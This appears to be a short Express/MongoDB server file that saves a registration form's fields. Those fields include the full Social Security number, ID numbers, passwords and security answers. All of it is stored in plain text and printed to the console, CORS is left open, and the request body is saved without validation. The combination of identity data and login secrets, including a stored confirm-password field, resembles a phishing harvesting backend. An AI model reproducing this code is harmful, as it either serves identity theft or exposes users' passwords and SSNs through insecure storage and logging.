// server.js
const express = require('express');
const cors = require('cors');
const path = require('path');
const mongoose = require('mongoose');
const dotenv = require('dotenv');

dotenv.config(); 

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// MongoDB Connection

const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/localFallbackDB";

mongoose.connect(MONGO_URI)
  .then(() => console.log('✅ Connected to MongoDB'))
  .catch((err) => console.error('❌ MongoDB connection error:', err));

// Mongoose Schema
const registrationSchema = new mongoose.Schema({
  firstName: String,
  middleName: String,
  lastName: String,
  dobMonth: String,
  dobDay: String,
  dobYear: String,
  ssn4: String,
  email: String,
  mobileNumber: String,
  address: String,
  city: String,
  state: String,
  zip: String,
  lived6months: String,
  termsAgreed: Boolean,

  username: String,
  password: String,
  confirmPassword: String,
  securityQuestion: String,
  securityAnswer: String,
  marketingConsent: Boolean,

  fullSsn: String,
  idType: String,
  idNumber: String,
  idState: String,
  idExpMonth: String,
  idExpYear: String,
  identityTerms: Boolean,
}, { timestamps: true });

const Registration = mongoose.model('Registration', registrationSchema);

// Helper: Convert checkbox "on"/undefined to Boolean
const parseCheckbox = (value) => value === 'on';

// Handle form submission
app.post('/submit', async (req, res) => {
  try {
    const cleanedData = {
      ...req.body,

      // Fix checkbox values
      termsAgreed: parseCheckbox(req.body.termsAgreed),
      marketingConsent: parseCheckbox(req.body.marketingConsent),
      identityTerms: parseCheckbox(req.body.identityTerms),
    };

    const registration = new Registration(cleanedData);
    await registration.save();

    console.log('✅ Registration saved:', cleanedData);
    res.status(200).json({ message: 'Registration successful' });
  } catch (err) {
    console.error('❌ Error saving registration:', err);
    res.status(500).json({ error: 'Server error saving data' });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
